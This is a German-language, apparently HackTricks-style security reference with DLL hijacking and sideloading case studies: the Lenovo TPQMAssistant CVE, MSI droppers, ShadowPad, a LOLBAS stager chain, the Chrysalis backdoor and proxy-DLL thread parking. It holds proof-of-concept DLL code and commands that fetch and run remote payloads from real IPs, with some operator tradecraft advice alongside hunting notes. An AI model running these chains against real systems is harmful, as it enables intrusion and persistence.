## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieses Case Study zeigt **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), verfolgt als **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` läuft täglich um 9:30 AM unter dem Kontext des angemeldeten Users.
- **Directory Permissions**: Schreibbar für `CREATOR OWNER`, wodurch lokale User beliebige Dateien ablegen können.
- **DLL Search Behavior**: Versucht zuerst, `hostfxr.dll` aus seinem Arbeitsverzeichnis zu laden, und protokolliert "NAME NOT FOUND", falls sie fehlt, was auf eine lokale Verzeichnis-Suche mit Vorrang hinweist.

### Exploit Implementation

Ein Angreifer kann einen bösartigen `hostfxr.dll`-Stub im selben Verzeichnis platzieren und die fehlende DLL ausnutzen, um Codeausführung im Kontext des Users zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Warten, bis die geplante Aufgabe um 9:30 AM im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn beim Ausführen der Aufgabe ein Administrator angemeldet ist, läuft die bösartige DLL in der Session des Administrators mit mittlerer Integrität.
4. Standard-UAC-bypass-Techniken verketten, um von mittlerer Integrität zu SYSTEM-Privilegien zu eskalieren.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors kombinieren häufig MSI-basierte Dropper mit DLL side-loading, um Payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.

Chain overview
- User lädt MSI herunter. Eine CustomAction läuft während der GUI-Installation lautlos (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der Dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: Avast-signierte wsc_proxy.exe + angreiferkontrollierte wsc.dll).
- Wenn die signierte EXE gestartet wird, lädt die Windows DLL search order wsc.dll zuerst aus dem working directory und führt den Angreifercode unter einem signierten Parent aus (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Achte auf Einträge, die ausführbare Dateien oder VBScript ausführen. Verdächtiges Beispielmuster: LaunchApplication, das eine eingebettete Datei im Hintergrund ausführt.
- In Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary prüfen.
- Eingebettete/aufgeteilte Payloads in der MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oder lessmsi verwenden: lessmsi x package.msi C:\out
- Achte auf mehrere kleine Fragmente, die durch eine VBScript CustomAction zusammengefügt und entschlüsselt werden. Typischer Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktisches sideloading mit wsc_proxy.exe
- Lege diese zwei Dateien in denselben Ordner:
- wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll per Namen aus seinem Verzeichnis zu laden.
- wsc.dll: Angreifer-DLL. Wenn keine speziellen Exports erforderlich sind, kann DllMain ausreichen; andernfalls erstelle eine proxy DLL und leite die benötigten Exports an die echte Bibliothek weiter, während die payload in DllMain ausgeführt wird.
- Erstelle eine minimale DLL-payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Export-Anforderungen verwende ein proxying framework (z. B. DLLirant/Spartacus), um eine Forwarding-DLL zu erzeugen, die außerdem dein Payload ausführt.

- Diese Technik beruht auf der DLL-Name-Resolution durch die Host-Binary. Wenn der Host absolute Pfade oder sichere Loading-Flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die Priorität beeinflussen und müssen bei der Auswahl der Host-Binary und des Export-Sets berücksichtigt werden.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point beschrieb, wie Ink Dragon ShadowPad mit einer **three-file triad** ausliefert, um sich unter legitimer Software zu verstecken und gleichzeitig das Core-Payload verschlüsselt auf der Festplatte zu halten:

1. **Signed host EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die Executable so um, dass sie wie eine Windows-Binary aussieht (zum Beispiel `conhost.exe`), aber die Authenticode-Signatur bleibt gültig.
2. **Malicious loader DLL** – wird neben der EXE mit einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist normalerweise eine MFC-Binary, die mit dem ScatterBrain framework obfuskiert ist; ihre einzige Aufgabe ist es, den verschlüsselten Blob zu finden, ihn zu entschlüsseln und ShadowPad reflectively zu laden.
3. **Encrypted payload blob** – wird oft als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem das entschlüsselte Payload per memory-mapping geladen wurde, löscht der Loader die TMP-Datei, um forensische Beweise zu vernichten.

Tradecraft notes:

* Das Umbenennen der signierten EXE (während das ursprüngliche `OriginalFileName` im PE-Header erhalten bleibt) lässt sie wie eine Windows-Binary erscheinen und trotzdem die Vendor-Signatur behalten; repliziere also Ink Dragons Vorgehen, `conhost.exe`-ähnliche Binaries abzulegen, die in Wirklichkeit AMD/NVIDIA-Utilities sind.
* Da die Executable weiterhin als vertrauenswürdig gilt, müssen die meisten Allowlisting-Kontrollen nur deine malicious DLL neben ihr sehen. Konzentriere dich darauf, die Loader DLL anzupassen; der signierte Parent kann normalerweise unverändert bleiben.
* ShadowPads decryptor erwartet, dass der TMP-Blob neben dem Loader liegt und schreibbar ist, damit die Datei nach dem Mapping auf null gesetzt werden kann. Lass das Verzeichnis schreibbar, bis das Payload geladen ist; sobald es im Speicher liegt, kann die TMP-Datei für OPSEC sicher gelöscht werden.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatoren kombinieren DLL sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf der Festplatte die malicious DLL neben der vertrauenswürdigen EXE ist:

- **Remote command loader (Finger):** Verstecktes PowerShell startet `cmd.exe /c`, zieht Befehle von einem Finger-Server und piped sie an `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` zieht TCP/79-Text; `| cmd` führt die Server-Antwort aus und ermöglicht es Operatoren, den zweiten Stage serverseitig zu rotieren.

- **Built-in download/extract:** Lade ein Archiv mit einer harmlosen Erweiterung herunter, entpacke es und stage das sideload-Ziel plus DLL in einem zufälligen `%LocalAppData%`-Ordner:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` blendet Fortschritt aus und folgt Redirects; `tar -xf` verwendet das integrierte tar von Windows.

- **WMI/CIM launch:** Starte die EXE über WMI, damit Telemetry einen von CIM erzeugten Prozess zeigt, während er die nebenliegende DLL lädt:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funktioniert mit Binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); das Payload (z. B. Remcos) läuft unter dem vertrauenswürdigen Namen.

- **Hunting:** Alarme auf `forfiles`, wenn `/p`, `/m` und `/c` zusammen auftreten; außerhalb von Admin-Skripten ungewöhnlich.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Eine kürzliche Lotus Blossom-Intrusion missbrauchte eine vertrauenswürdige Update-Kette, um einen NSIS-gepackten Dropper zu liefern, der ein DLL sideload plus vollständig in-memory Payloads vorbereitete.

Tradecraft flow
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert es als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine malicious `log.dll` und einen verschlüsselten Blob `BluetoothService` ab und startet dann die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den Blob per mmap; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Key-Material aus einem vorherigen Hash abgeleitet), überschreibt den Buffer mit Plaintext-Shellcode, gibt temporäre Daten frei und springt hinein.
- Um eine IAT zu vermeiden, löst der Loader APIs per Hashing von Export-Namen auf, indem er **FNV-1a basis 0x811C9DC5 + prime 0x1000193** verwendet, dann eine Murmur-ähnliche avalanche (**0x85EBCA6B**) anwendet und mit gesalzenen Target-Hashes vergleicht.

Main shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Main-Module, indem es add/XOR/sub mit dem Key `gQ2JR&9;` über fünf Durchläufe wiederholt, und lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Import-Resolution abzuschließen.
- Rekonstruiert DLL-Namensstrings zur Laufzeit über pro-Zeichen Bit-Rotate/XOR-Transformationen und lädt dann `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der durch die **PEB → InMemoryOrderModuleList** läuft, jede Export-Tabelle in 4-Byte-Blöcken mit Murmur-ähnlichem Mixing parst und nur auf `GetProcAddress` zurückfällt, wenn der Hash nicht gefunden wird.

Embedded configuration & C2
- Die Konfiguration liegt innerhalb der abgelegten Datei `BluetoothService` bei **offset 0x30808** (Größe **0x980**) und wird mit RC4 und dem Key `qwhvb^435h&*7` entschlüsselt, wodurch die C2-URL und der User-Agent sichtbar werden.
- Beacons bauen ein durch Punkte getrenntes Host-Profil auf, stellen das Tag `4Q` voran und verschlüsseln dann mit RC4-Key `vAuig34%^325hGV`, bevor sie `HttpSendRequestA` über HTTPS verwenden. Antworten werden per RC4 entschlüsselt und über einen Tag-Switch verarbeitet (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Der Ausführungsmodus wird über CLI args gesteuert: keine args = install persistence (service/Run key), das auf `-i` verweist; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt das Payload aus.

Alternate loader observed
- Dieselbe Intrusion legte Tiny C Compiler ab und führte `svchost.exe -nostdlib -run conf.c` von `C:\ProgramData\USOShared\` aus, mit `libtcc.dll` daneben. Der vom Angreifer bereitgestellte C-Source enthielt eingebetteten Shellcode, wurde kompiliert und lief vollständig in-memory, ohne die Festplatte mit einer PE zu berühren. Repliziere mit:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Diese TCC-basierte Compile-and-Run-Phase importierte `Wininet.dll` zur Laufzeit und zog eine zweite Shellcode-Stage von einer hardcodierten URL, was einen flexiblen Loader ergab, der sich als Compiler-Ausführung tarnt.

## Signed-host sideloading mit export proxying + host thread parking

Einige DLL sideloading-Ketten fügen **Stability Engineering** hinzu, damit der legitime Host lange genug aktiv bleibt, um spätere Stages sauber zu laden, statt nach dem Laden der bösartigen DLL abzustürzen.

Beobachtetes Muster
- Lege eine vertrauenswürdige EXE neben eine bösartige DLL mit dem erwarteten Abhängigkeitsnamen wie `version.dll`.
- Die bösartige DLL **proxyt alle erwarteten Exports** an die echte System-DLL zurück (zum Beispiel `%SystemRoot%\\System32\\version.dll`), damit die Importauflösung weiterhin funktioniert und der Host-Prozess weiterläuft.
- Nach dem Laden **patcht die bösartige DLL den Host-Entry-Point**, sodass der Main Thread in einer endlosen `Sleep`-Schleife landet, statt zu beenden oder Codepfade auszuführen, die den Prozess beenden würden.
- Ein neuer Thread erledigt die eigentliche bösartige Arbeit: Entschlüsseln des Namens oder Pfads der nächsten DLL-Stage (RC4/XOR sind üblich) und anschließend Starten mit `LoadLibrary`.

Warum das wichtig ist
- Normales DLL proxying erhält die API-Kompatibilität, garantiert aber nicht, dass der Host lange genug aktiv bleibt, damit spätere Stages laufen können.
- Den Main Thread in `Sleep(INFINITE)` zu parken, ist eine einfache Methode, den signierten Prozess resident zu halten, während der Loader in einem Worker-Thread entschlüsselt, staged oder einen Netzwerk-Bootstrap durchführt.
- Nur nach einem verdächtigen `DllMain` zu suchen, verpasst dieses Muster, wenn das interessante Verhalten erst nach dem Patchen des Host-Entry-Points und dem Start eines sekundären Threads passiert.

Minimaler Ablauf
1. Kopiere die signierte Host-EXE und ermittle die DLL, die sie aus dem lokalen Verzeichnis auflöst.
2. Baue eine Proxy-DLL, die dieselben Funktionen exportiert und an die legitime DLL weiterleitet.
3. Erzeuge in `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread.
4. Patche von diesem Thread aus den Host-Entry-Point oder die Start-Routine des Main Threads so, dass sie in `Sleep`-Schleifen läuft.
5. Entschlüssele den Namen/die Konfiguration der nächsten DLL-Stage und rufe `LoadLibrary` auf oder manual-map den Payload.

Defensive Ansatzpunkte
- Signierte Prozesse laden `version.dll` oder ähnlich verbreitete Libraries aus ihrem eigenen Anwendungsverzeichnis statt aus `System32`.
- Speicher-Patches am Prozess-Entry-Point kurz nach dem Image-Load, besonders Sprünge/Aufrufe, die auf `Sleep`/`SleepEx` umgeleitet werden.
- Threads, die von einer Proxy-DLL erzeugt werden und sofort `LoadLibrary` auf einer zweiten DLL mit entschlüsseltem Namen aufrufen.
- Full-export-Proxy-DLLs, die neben Vendor-Exes in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden abgelegt werden.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
